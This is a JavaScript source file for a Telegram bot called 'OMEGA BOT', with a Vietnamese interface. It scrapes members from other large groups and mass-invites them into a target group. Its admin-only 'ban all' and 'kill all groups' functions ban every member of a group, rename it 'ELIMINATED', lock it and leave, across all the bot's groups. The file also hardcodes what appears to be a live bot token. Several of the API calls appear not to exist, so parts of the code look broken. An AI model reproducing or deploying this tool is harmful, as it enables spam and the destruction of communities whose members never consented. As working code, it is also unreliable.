// ============================================================
// OMEGA BOT v666 — CHỈ ADMIN MỚI THẤY NÚT BAN
// ============================================================

const express = require('express');
const { Telegraf, session, Markup } = require('telegraf');

// ==================== CONFIG ====================
const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
const ADMIN_ID = 7757046138;
const TARGET_GROUP_LINK = 'https://t.me/your_group';

// ==================== PROTECTED ====================
const PROTECTED_USERNAMES = ['ongvuaphantich'];
const PROTECTED_IDS = [];

function isProtected(chat) {
  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) return true;
  if (PROTECTED_IDS.includes(chat.id)) return true;
  return false;
}

// ==================== ENGINE ====================
const app = express();
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let pullActive = false;
let pulledCount = 0;
let isKilling = false;

// ==================== MENU CHỈ DÀNH CHO ADMIN ====================
function getMenu(isAdmin) {
  const buttons = [
    [Markup.button.callback('🚀 BẮT ĐẦU KÉO MEM', 'pull_on')],
    [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')],
  ];

  // 🔥 CHỈ ADMIN MỚI THẤY NÚT BAN
  if (isAdmin) {
    buttons.push([Markup.button.callback('🔨 BAN ALL - GIẾT GROUP', 'ban_all')]);
    buttons.push([Markup.button.callback('☠️ GIẾT TẤT CẢ GROUP', 'kill_all')]);
  }

  buttons.push([Markup.button.callback('📊 XEM THỐNG KÊ', 'status')]);
  buttons.push([Markup.button.url('🔗 LINK GROUP CHÍNH', TARGET_GROUP_LINK)]);
  buttons.push([Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]);

  return Markup.inlineKeyboard(buttons);
}

// ==================== WELCOME ====================
bot.start(async (ctx) => {
  const user = ctx.from;
  const isAdmin = user.id === ADMIN_ID;

  const welcomeMessage = `
🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**

━━━━━━━━━━━━━━━━━━━━━
👋 **Xin chào, ${user.first_name || 'đồng chí'}!**

🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
⚡ **Tự động kéo thành viên từ mọi nhóm lớn**
${isAdmin ? '🔨 **Lệnh BAN ALL giết sạch group chỉ trong vài giây**\n☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**' : '🔒 **Bạn là thành viên thường — chỉ xem được thống kê**'}
🛡️ **Group @ongvuaphantich đã được bảo vệ**

━━━━━━━━━━━━━━━━━━━━━
📌 **Hướng dẫn sử dụng:**

• Bấm **"🚀 BẮT ĐẦU KÉO MEM"** → bot tự động kéo mem
• Bấm **"🛑 DỪNG KÉO"** → tạm dừng
${isAdmin ? '• Bấm **"🔨 BAN ALL"** → giết sạch group hiện tại\n• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** → hủy diệt toàn bộ' : ''}
• Bấm **"📊 XEM THỐNG KÊ"** → xem số liệu

━━━━━━━━━━━━━━━━━━━━━
💡 **Bot hoàn toàn miễn phí — dùng thoải mái!**
🛡️ **Được bảo vệ: @ongvuaphantich**

🔥 **Chúc bạn chinh phục mọi group!**
`;

  await ctx.replyWithHTML(welcomeMessage, getMenu(isAdmin));
});

// ==================== AUTO PULL ====================
async function autoPull() {
  if (!pullActive) return;
  
  try {
    const target = await bot.telegram.getChat(TARGET_GROUP_LINK);
    const dialogs = await bot.telegram.getChats();
    const largeGroups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      d.id !== target.id &&
      !isProtected(d)
    );

    for (const group of largeGroups) {
      if (!pullActive) break;
      
      try {
        const membersCount = await bot.telegram.getChatMembersCount(group.id);
        if (membersCount < 30) continue;

        const admins = await bot.telegram.getChatAdministrators(group.id);
        const adminIds = admins.map(a => a.user.id);
        
        const participants = await bot.telegram.getChatMembers(group.id, { limit: 15 });
        
        for (const member of participants) {
          if (!pullActive) break;
          if (member.user.id === ADMIN_ID) continue;
          if (member.user.is_bot) continue;
          if (adminIds.includes(member.user.id)) continue;

          try {
            await bot.telegram.inviteToChat(target.id, member.user.id);
            pulledCount++;
            console.log(`✅ Kéo thành công: ${member.user.first_name} (${pulledCount})`);
            await new Promise(r => setTimeout(r, 1500));
          } catch (e) {
            console.log(`⚠️ Lỗi kéo: ${e.message}`);
          }
        }
      } catch (e) {
        console.log(`⚠️ Lỗi group: ${e.message}`);
      }
    }
  } catch (e) {
    console.log(`⚠️ Lỗi pull cycle: ${e.message}`);
  }
}

// ==================== BAN ALL ====================
async function banAllMembers(chatId, ctx) {
  let banned = 0;
  let failed = 0;
  let total = 0;

  try {
    // 🔥 KIỂM TRA BOT CÓ QUYỀN ADMIN KHÔNG
    const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
    if (!botMember.status.includes('administrator') && botMember.status !== 'creator') {
      throw new Error('Bot chưa được làm admin trong group này! Thêm bot làm admin rồi thử lại.');
    }

    const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
    total = participants.length;
    
    for (const member of participants) {
      if (member.user.id === ADMIN_ID) continue;
      if (member.user.id === ctx.botInfo.id) continue;
      if (member.user.is_bot) continue;

      try {
        await ctx.telegram.banChatMember(chatId, member.user.id);
        banned++;
        await new Promise(r => setTimeout(r, 100));
      } catch (e) {
        failed++;
      }
    }
    
    // Xóa group sau khi ban
    try {
      await ctx.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
      await ctx.telegram.setChatPermissions(chatId, {
        can_send_messages: false,
        can_send_media: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      await ctx.telegram.leaveChat(chatId);
    } catch {}

    return { banned, failed, total };
  } catch (e) {
    throw new Error(e.message);
  }
}

// ==================== HANDLE BUTTONS ====================
bot.action('pull_on', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (pullActive) return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
  
  pullActive = true;
  await ctx.answerCbQuery('🚀 BẮT ĐẦU KÉO MEM!');
  await ctx.editMessageText(
    `🔥 **OMEGA PULL ENGINE ACTIVATED**\n\n` +
    `🔄 Trạng thái: **ĐANG KÉO MEM**\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Bot đang quét và kéo mem từ các nhóm lớn...*`,
    getMenu(true)
  );
  
  while (pullActive) {
    await autoPull();
    await new Promise(r => setTimeout(r, 25000));
  }
});

bot.action('pull_off', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (!pullActive) return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
  
  pullActive = false;
  await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
  await ctx.editMessageText(
    `⏸️ **OMEGA PULL ENGINE STOPPED**\n\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Đang chờ lệnh tiếp theo...*`,
    getMenu(true)
  );
});

// 🔥 CHỈ ADMIN MỚI BẤM ĐƯỢC NÚT BAN
bot.action('ban_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
  }
  
  const chat = ctx.chat;
  
  if (isProtected(chat)) {
    return ctx.answerCbQuery('🛡️ Được bảo vệ!');
  }
  
  if (!chat.type.includes('group')) {
    return ctx.answerCbQuery('⚠️ Chỉ dùng trong group!');
  }
  
  if (isKilling) {
    return ctx.answerCbQuery('⏳ Đang giết rồi!');
  }
  
  isKilling = true;
  await ctx.answerCbQuery('🔨 ĐANG GIẾT!');
  
  try {
    const result = await banAllMembers(chat.id, ctx);
    await ctx.reply(`✅ Đã giết ${result.banned} người.`);
  } catch (e) {
    await ctx.reply(`❌ ${e.message}`);
  }
  
  isKilling = false;
});

bot.action('kill_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
  }
  
  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
  
  isKilling = true;
  await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
  await ctx.reply('☠️ Đang giết tất cả group...');
  
  try {
    const dialogs = await ctx.telegram.getChats();
    const groups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      !isProtected(d)
    );
    
    let killed = 0;
    let totalBanned = 0;
    
    for (const group of groups) {
      try {
        const result = await banAllMembers(group.id, ctx);
        killed++;
        totalBanned += result.banned;
        await ctx.reply(`✅ Đã giết group ${group.title || group.id} — ${result.banned} người`);
        await new Promise(r => setTimeout(r, 800));
      } catch (e) {
        await ctx.reply(`❌ Lỗi group ${group.title || group.id}: ${e.message}`);
      }
    }

    await ctx.reply(
      `✅ **TOTAL ANNIHILATION COMPLETE**\n` +
      `☠️ Đã giết: ${killed} groups\n` +
      `💀 Tổng số người bị ban: ${totalBanned}\n` +
      `🛡️ Đã bỏ qua: @ongvuaphantich`
    );
  } catch (e) {
    await ctx.reply(`❌ Lỗi: ${e.message}`);
  }
  
  isKilling = false;
});

bot.action('status', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  
  try {
    const me = await ctx.telegram.getMe();
    const dialogs = await ctx.telegram.getChats();
    const groups = dialogs.filter(d => d.type === 'group' || d.type === 'supergroup').length;
    
    await ctx.answerCbQuery('📊 Thống kê đây!');
    await ctx.editMessageText(
      `📊 **OMEGA BOT STATUS**\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `🤖 Bot: ${me.first_name}\n` +
      `🆔 ID: ${me.id}\n` +
      `👥 Số group: ${groups}\n` +
      `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
      `📊 Đã kéo: ${pulledCount} người\n` +
      `🎯 Target: ${TARGET_GROUP_LINK}\n` +
      `🛡️ Bảo vệ: @ongvuaphantich\n` +
      `👑 Admin: ${ADMIN_ID}\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `*"Mày command. Tao execute."*`,
      getMenu(true)
    );
  } catch (e) {
    await ctx.reply(`❌ Lỗi: ${e.message}`);
  }
});

// ==================== WEB SERVER ====================
app.use(express.json());
app.get('/', (req, res) => {
  res.send(`
    <h1>🐱 OMEGA BOT</h1>
    <p>🔥 Kéo mem MIỄN PHÍ + BAN ALL</p>
    <p>👑 Admin: ${ADMIN_ID}</p>
    <p>📊 Đã kéo: ${pulledCount} người</p>
    <p>⚡ Trạng thái: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}</p>
    <p>🛡️ Bảo vệ: @ongvuaphantich</p>
    <hr>
    <p><i>Supreme Bot for Butter — 2026</i></p>
  `);
});

// ==================== LAUNCH ====================
const PORT = process.env.PORT || 3000;

bot.launch()
  .then(() => console.log('✅ OMEGA BOT đã khởi động thành công!'))
  .catch((err) => {
    console.error('❌ Lỗi khởi động bot:', err);
    process.exit(1);
  });

app.listen(PORT, () => {
  console.log(`✅ Web server chạy trên port ${PORT}`);
  console.log(`🐱 OMEGA BOT ONLINE`);
  console.log(`👑 Admin: ${ADMIN_ID}`);
  console.log(`🛡️ Bảo vệ: @ongvuaphantich`);
});

process.once('SIGINT', () => { bot.stop('SIGINT'); process.exit(0); });
process.once('SIGTERM', () => { bot.stop('SIGTERM'); process.exit(0); });
